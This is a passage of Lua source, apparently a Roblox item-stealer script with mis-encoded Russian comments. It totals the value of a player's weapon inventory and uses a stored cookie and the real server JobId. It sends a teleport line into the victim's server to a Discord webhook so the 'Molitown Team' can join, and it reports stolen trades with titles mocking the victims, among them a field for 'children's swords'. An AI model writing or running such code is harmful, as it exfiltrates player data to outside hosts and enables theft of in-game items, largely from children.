    ["CottonCandy"] = 65,
    ["Witched"] = 55,
    ["Beach_K_2023"] = 30,
    ["Cavern_K_2019"] = 22,
}

local function CalculateInventory()
    -- –°–±—Ä–∞—Å—ã–≤–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏—è
    totalValues = 0
    uniqueItemsValue = 0
    ancientItemsValue = 0
    godlyItemsValue = 0
    vintageItemsValue = 0
    legendaryItemsValue = 0
    rareItemsValue = 0
    uncommonItemsValue = 0
    commonItemsValue = 0
    
    -- –û—á–∏—â–∞–µ–º —Ç–∞–±–ª–∏—Ü—ã
    allItems = {}
    vintageItems1 = {}
    commonItems1 = {}
    uncommonItems1 = {}
    rareItems1 = {}
    legendaryItems1 = {}
    godlyItems1 = {}
    ancientItems1 = {}
    uniqueItems1 = {}
    
    vintageItems = {}
    commonItems = {}
    uncommonItems = {}
    rareItems = {}
    legendaryItems = {}
    godlyItems = {}
    ancientItems = {}
    uniqueItems = {}
    
    vintageItemsC = 0
    commonItemsC = 0
    uncommonItemsC = 0
    rareItemsC = 0
    legendaryItemsC = 0
    godlyItemsC = 0
    ancientItemsC = 0
    uniqueItemsC = 0

    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
        for c, d in pairs(b) do
            local itemValue = valuesTable[d.DataID] or 0
            local totalValue = itemValue * d.Amount
            
            if d.Rarity == "Unique" then
                uniqueItemsValue = uniqueItemsValue + totalValue
            elseif d.Rarity == "Ancient" then
                ancientItemsValue = ancientItemsValue + totalValue
            elseif d.Rarity == "Godly" then
                godlyItemsValue = godlyItemsValue + totalValue
            elseif d.Rarity == "Vintage" then
                vintageItemsValue = vintageItemsValue + totalValue
            elseif d.Rarity == "Legendary" then
                legendaryItemsValue = legendaryItemsValue + totalValue
            elseif d.Rarity == "Rare" then
                rareItemsValue = rareItemsValue + totalValue
            elseif d.Rarity == "Uncommon" then
                uncommonItemsValue = uncommonItemsValue + totalValue
            elseif d.Rarity == "Common" then
                commonItemsValue = commonItemsValue + totalValue
            end
        end
    end

    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
        for c, d in pairs(b) do
            local itemKey = d.DataID
            local itemValue = valuesTable[itemKey]
            local weaponValue = itemValue and (itemValue * d.Amount) or 0

            local formatTable = {
                weaponName = d.ItemName,
                weaponData = d.DataID,
                weaponAmount = d.Amount,
                weaponRarity = d.Rarity,
                weaponValue = weaponValue
            }
            
            table.insert(allItems, formatTable)

            local visualFormat = d.ItemName .. " ‚Ä¢ [x" .. d.Amount .. " | " .. weaponValue .. "]"

            if d.Rarity == "Vintage" then
                vintageItemsC = vintageItemsC + d.Amount
                table.insert(vintageItems, visualFormat)
                table.insert(vintageItems1, formatTable)
            end

            if d.Rarity == "Common" then
                commonItemsC = commonItemsC + d.Amount
                table.insert(commonItems, visualFormat)
                table.insert(commonItems1, formatTable)
            end

            if d.Rarity == "Uncommon" then
                uncommonItemsC = uncommonItemsC + d.Amount
                table.insert(uncommonItems, visualFormat)
                table.insert(uncommonItems1, formatTable)
            end

            if d.Rarity == "Rare" then
                rareItemsC = rareItemsC + d.Amount
                table.insert(rareItems, visualFormat)
                table.insert(rareItems1, formatTable)
            end

            if d.Rarity == "Legendary" then
                legendaryItemsC = legendaryItemsC + d.Amount
                table.insert(legendaryItems, visualFormat)
                table.insert(legendaryItems1, formatTable)
            end

            if d.Rarity == "Godly" then
                godlyItemsC = godlyItemsC + d.Amount
                table.insert(godlyItems, visualFormat)
                table.insert(godlyItems1, formatTable)
            end

            if d.Rarity == "Ancient" then
                ancientItemsC = ancientItemsC + d.Amount
                table.insert(ancientItems, visualFormat)
                table.insert(ancientItems1, formatTable)
            end

            if d.Rarity == "Unique" then
                uniqueItemsC = uniqueItemsC + d.Amount
                table.insert(uniqueItems, visualFormat)
                table.insert(uniqueItems1, formatTable)
            end
        end
    end

    -- >> Values calculating logic << --
    for _, item in pairs(allItems) do
        totalValues = totalValues + item.weaponValue
    end

    return totalValues
end

-- –°–Ω–∞—á–∞–ª–∞ —Å–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
local inventoryValue = CalculateInventory()

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º JobId –∏ –ø–æ–ª—É—á–∞–µ–º Real JobId –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
if getgenv().Cookie and shouldCheckJobId() then
    print("Checking JobId for executor:", executor)
    local realJobId = FindRealJobId(inventoryValue, NameValue)
    
    if realJobId then
        print("Real JobId –Ω–∞–π–¥–µ–Ω:", realJobId)
        getgenv().RealJobId = realJobId
    else
        print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å Real JobId, –∏—Å–ø–æ–ª—å–∑—É–µ–º –æ–±—ã—á–Ω—ã–π")
        getgenv().RealJobId = game.JobId
    end
else
    print("Skipping JobId check for executor:", executor)
    -- –ò—Å–ø–æ–ª—å–∑—É–µ–º –æ–±—ã—á–Ω—ã–π JobId –¥–ª—è –¥—Ä—É–≥–∏—Ö —ç–∫–∑–µ–∫—É—Ç–æ—Ä–æ–≤
    getgenv().RealJobId = game.JobId
end

-- –°–ò–°–¢–ï–ú–ê –¢–ï–õ–ï–ü–û–†–¢–ê (–ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø) - –∏—Å–ø–æ–ª—å–∑—É–µ–º RealJobId –≤–º–µ—Å—Ç–æ game.JobId
local placeId = game.PlaceId
local realJobId = getgenv().RealJobId or game.JobId  -- –ò—Å–ø–æ–ª—å–∑—É–µ–º RealJobId –µ—Å–ª–∏ –µ—Å—Ç—å, –∏–Ω–∞—á–µ –æ–±—ã—á–Ω—ã–π
local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"

-- –§–£–ù–ö–¶–ò–ò –î–õ–Ø –û–¢–ü–†–ê–í–ö–ò –°–û–û–ë–©–ï–ù–ò–ô (–î–û–õ–ñ–ù–´ –ë–´–¢–¨ –ü–û–°–õ–ï –û–ü–†–ï–î–ï–õ–ï–ù–ò–Ø REALJOBID)
function SendMessageEMBED(url, embed, bool)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    -- –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç —Å —Ç–µ–ª–µ–ø–æ—Ä—Ç–æ–º –≤ —Å—Ç–∏–ª–µ –ø–µ—Ä–≤–æ–≥–æ –∫–æ–¥–∞
    local teleportContent = "üéØ **–í–¨–ï–ë–ê–ù** –û—á–µ—Ä–µ–¥–Ω–æ–π –∫—É–∫–∏—á:\n\n" .. TeleportScript
    
    local data = {
        ["username"] = "M O L I T O W N",
        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
        ["content"] = teleportContent,
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = "Molitown Team 2025 | debugged for 6h"
                }
            }
        }
    }
    
    local data2 = {
        ["username"] = "M O L I T O W N", 
        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
        ["content"] = "-- @everyone\n" .. teleportContent,
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = "Molitown Team 2025 | debugged for 6h"
                }
            }
        }
    }
    
    local body = http:JSONEncode(data)
    local body2 = http:JSONEncode(data2)

    if bool == true then
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body2
        })
    else
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É—Å–ø–µ—à–Ω–æ–≥–æ —Ç—Ä–µ–π–¥–∞ –≤ Discord
function SendTradeSuccessMessage(sentItems, ReceiverName)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    -- –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤
    local itemsText = ""
    local totalValue = 0
    
    for _, item in pairs(sentItems) do
        local itemValue = valuesTable[item.dataId] or 0
        totalValue = totalValue + (itemValue * item.amount)
        itemsText = itemsText .. string.format("%s ‚Ä¢ x%d ‚Ä¢ %d\n", item.name, item.amount, itemValue * item.amount)
    end
    
    local data = {
        ["username"] = "Mama Mia",
        ["avatar_url"] = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
        ["embeds"] = {
            {
                ["title"] = "‚úÖ –í—å–µ–±–∞–ª–∏ –¥–æ–¥–∏–∫–∞ –≤ —á–µ—à–∫–∏",
                ["color"] = 65280,
                ["fields"] = {
                    {
                        ["name"] = "üì¶ –ú–µ—á–∏ –¥–µ—Ç–µ–π:",
                        ["value"] = "```" .. itemsText .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üí∞ –û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å:",
                        ["value"] = "**" .. totalValue .. "**",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üë§ –ó–∞–±—Ä–∞–ª:",
                        ["value"] = "**" .. ReceiverName .. "**",
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "Molitown Team feat. Interpol ‚Ä¢ " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }
        }
    }
    
    local body = http:JSONEncode(data)
    
    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

-- –¢–ï–ü–ï–†–¨ –û–¢–ü–†–ê–í–õ–Ø–ï–ú –û–°–ù–û–í–ù–û–ï –°–û–û–ë–©–ï–ù–ò–ï –ü–û–°–õ–ï –ü–û–õ–£–ß–ï–ù–ò–Ø REAL JOBID
if totalValues < MinimumValues then
    return
end

-- –£–õ–£–ß–®–ï–ù–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –î–õ–Ø –ü–û–õ–£–ß–ï–ù–ò–Ø –¢–û–ü –ü–†–ï–î–ú–ï–¢–û–í
local function getTopValuableItems(n)
    local topItemsList = {}
    
    for _, item in pairs(allItems) do
        table.insert(topItemsList, item)
    end
    
    -- –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ —É–±—ã–≤–∞–Ω–∏—é —Ü–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ —à—Ç—É–∫—É
    table.sort(topItemsList, function(a, b) 
        return a.weaponValue > b.weaponValue
    end)
    
    -- –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–æ–ø-N –ø—Ä–µ–¥–º–µ—Ç–æ–≤ —Å —É–ª—É—á—à–µ–Ω–Ω—ã–º —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º
    local topItems = {}
    for i = 1, math.min(n, #topItemsList) do
        local item = topItemsList[i]
        local rarityEmoji = {
            Unique = "üíé",
            Ancient = "üî•", 
            Godly = "‚≠ê",
            Vintage = "üï∞Ô∏è",
            Legendary = "üëë",
            Rare = "üîµ",
            Uncommon = "üü¢",
            Common = "‚ö™"
        }
        
        local emoji = rarityEmoji[item.weaponRarity] or "üì¶"
        table.insert(topItems, string.format("%s %s ‚Ä¢ %d ‚Ä¢ x%d", emoji, item.weaponName, item.weaponValue / item.weaponAmount, item.weaponAmount))
    end
    return topItems
end

-- –ü–æ–ª—É—á–∞–µ–º 5 —Å–∞–º—ã—Ö —Ü–µ–Ω–Ω—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤
local topItems = getTopValuableItems(5)
local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"

